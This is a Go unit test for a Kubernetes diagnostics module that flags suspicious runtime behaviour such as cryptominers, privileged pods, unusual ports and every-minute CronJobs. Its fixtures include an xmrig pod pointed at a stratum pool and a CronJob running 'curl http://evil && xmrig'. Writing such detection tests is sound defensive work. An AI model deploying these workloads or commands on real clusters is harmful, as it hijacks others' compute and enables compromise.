package diagnostics

import (
	"context"
	"net/http"
	"testing"
	"time"

	appsv1 "k8s.io/api/apps/v1"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func TestRuntimeBehaviorHelpersAndCheckRuntimeBehavior(t *testing.T) {
	now := time.Now()
	privileged := true
	prodNS := map[string]namespaceMeta{"prod": {name: "prod", labels: map[string]string{"environment": "production"}}}
	pod := corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{Name: "api", Namespace: "prod", CreationTimestamp: metav1.NewTime(now.Add(-20 * time.Minute))},
		Spec: corev1.PodSpec{
			ServiceAccountName: "default",
			Containers: []corev1.Container{{
				Name:            "api",
				Image:           "xmrig:latest",
				Command:         []string{"bash", "-c"},
				Args:            []string{"xmrig --url stratum+tcp://pool"},
				Ports:           []corev1.ContainerPort{{Name: "admin", ContainerPort: 31337}},
				SecurityContext: &corev1.SecurityContext{Privileged: &privileged},
			}},
			EphemeralContainers: []corev1.EphemeralContainer{{EphemeralContainerCommon: corev1.EphemeralContainerCommon{Name: "debug"}}},
		},
		Status: corev1.PodStatus{ContainerStatuses: []corev1.ContainerStatus{{Name: "api", RestartCount: 21}}},
	}
	event := corev1.Event{ObjectMeta: metav1.ObjectMeta{Name: "exec", Namespace: "prod", CreationTimestamp: metav1.NewTime(now.Add(-10 * time.Minute))}, InvolvedObject: corev1.ObjectReference{Kind: "Pod", Name: "api"}, Reason: "Exec", Message: "kubectl debug ephemeral container", Count: 20}
	cronjob := batchv1.CronJob{ObjectMeta: metav1.ObjectMeta{Name: "miner", Namespace: "prod", CreationTimestamp: metav1.NewTime(now.Add(-2 * time.Hour))}, Spec: batchv1.CronJobSpec{Schedule: "* * * * *", JobTemplate: batchv1.JobTemplateSpec{Spec: batchv1.JobSpec{Template: corev1.PodTemplateSpec{Spec: corev1.PodSpec{Containers: []corev1.Container{{Name: "job", Command: []string{"sh", "-c"}, Args: []string{"curl http://evil && xmrig"}}}}}}}}}
	daemonset := appsv1.DaemonSet{ObjectMeta: metav1.ObjectMeta{Name: "suspicious-agent", Namespace: "prod", CreationTimestamp: metav1.NewTime(now.Add(-2 * time.Hour))}, Spec: appsv1.DaemonSetSpec{Template: corev1.PodTemplateSpec{Spec: corev1.PodSpec{HostNetwork: true, Containers: []corev1.Container{{Name: "agent", SecurityContext: &corev1.SecurityContext{Privileged: &privileged}}}}}}, Status: appsv1.DaemonSetStatus{DesiredNumberScheduled: 1}}
	node := corev1.Node{ObjectMeta: metav1.ObjectMeta{Name: "node1"}}

	if len(suspiciousRestartPatternIssues([]corev1.Pod{pod})) == 0 || len(unexpectedExecUsageIssues([]corev1.Event{event})) == 0 {
		t.Fatal("expected restart and exec issues")
	}
	if len(recentEphemeralDebugContainerIssues([]corev1.Pod{pod}, []corev1.Event{event})) == 0 || len(recentPrivilegedPodIssues([]corev1.Pod{pod}, prodNS)) == 0 {
		t.Fatal("expected debug and privileged pod issues")
	}
	if len(suspiciousOutboundBehaviorIssues([]corev1.Pod{pod})) == 0 || len(unusualListeningPortIssues([]corev1.Pod{pod})) == 0 {
		t.Fatal("expected suspicious outbound behavior and unusual port issues")
	}
	if len(namespacePodChurnIssues([]corev1.Pod{pod, pod, pod, pod, pod, pod, pod, pod}, []corev1.Event{event}, prodNS)) == 0 {
		t.Fatal("expected namespace churn issue")
	}
	saIndex := map[string]corev1.ServiceAccount{"prod/default": {ObjectMeta: metav1.ObjectMeta{Name: "default", Namespace: "prod"}}}
	if len(recentUnexpectedTokenMountIssues([]corev1.Pod{pod}, saIndex, prodNS)) == 0 || len(unusualCronJobIssues([]batchv1.CronJob{cronjob}, prodNS)) == 0 {
		t.Fatal("expected token mount and cronjob issues")
	}
	pod.OwnerReferences = []metav1.OwnerReference{{Kind: "DaemonSet", Name: daemonset.Name}}
	if len(unexpectedDaemonSetIssues([]appsv1.DaemonSet{daemonset}, []corev1.Pod{pod}, []corev1.Node{node}, prodNS)) == 0 {
		t.Fatal("expected unexpected daemonset issue")
	}
	if daemonSetPodCount([]corev1.Pod{pod})["prod/suspicious-agent"] != 1 || !daemonSetLooksUnexpected(daemonset, 1) || !daemonSetTemplateLooksPrivileged(daemonset.Spec.Template.Spec) {
		t.Fatal("unexpected daemonset helper behavior")
	}
	if !looksUnusualContainerPort(corev1.ContainerPort{Name: "debug", ContainerPort: 31337}) || !cronScheduleLooksSuspicious("*/1 * * * *") {
		t.Fatal("expected port and cron helper matches")
	}
	if len(cronBehaviorFields(cronjob.Spec.JobTemplate.Spec.Template.Spec.Containers[0])) == 0 || eventTimestamp(event).IsZero() {
		t.Fatal("expected cron fields and event timestamp")
	}
	if !containsAny("xmrig", miningMarkers()) || truncateString("abcdef", 5) != "ab..." || maxInt(1, 7, 3) != 7 {
		t.Fatal("unexpected generic helper behavior")
	}

	ctx := context.Background()
	cs := newHTTPBackedClientset(t, func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/v1/namespaces/prod/pods":
			writeJSONResponse(t, w, http.StatusOK, &corev1.PodList{Items: []corev1.Pod{pod}})
		case "/api/v1/namespaces/prod/events":
			writeJSONResponse(t, w, http.StatusOK, &corev1.EventList{Items: []corev1.Event{event}})
		case "/apis/batch/v1/namespaces/prod/cronjobs":
			writeJSONResponse(t, w, http.StatusOK, &batchv1.CronJobList{Items: []batchv1.CronJob{cronjob}})
		case "/apis/apps/v1/namespaces/prod/daemonsets":
			writeJSONResponse(t, w, http.StatusOK, &appsv1.DaemonSetList{Items: []appsv1.DaemonSet{daemonset}})
		case "/api/v1/nodes":
			writeJSONResponse(t, w, http.StatusOK, &corev1.NodeList{Items: []corev1.Node{node}})
		case "/api/v1/namespaces/prod/serviceaccounts":
			writeJSONResponse(t, w, http.StatusOK, &corev1.ServiceAccountList{Items: []corev1.ServiceAccount{{ObjectMeta: metav1.ObjectMeta{Name: "default", Namespace: "prod"}}}})
		case "/api/v1/namespaces/prod":
			writeJSONResponse(t, w, http.StatusOK, &corev1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: "prod", Labels: map[string]string{"environment": "production"}}})
		default:
			writeJSONResponse(t, w, http.StatusNotFound, map[string]string{"error": "not found"})
		}
	})
	issues, err := CheckRuntimeBehavior(ctx, cs, "prod")
	if err != nil {
		t.Fatalf("CheckRuntimeBehavior returned error: %v", err)
	}
	if len(issues) < 6 {
		t.Fatalf("expected runtime behavior issues, got %+v", issues)
	}
	if _, err := CheckRuntimeBehavior(ctx, nil, "prod"); err == nil {
		t.Fatal("expected nil clientset to fail")
	}
}
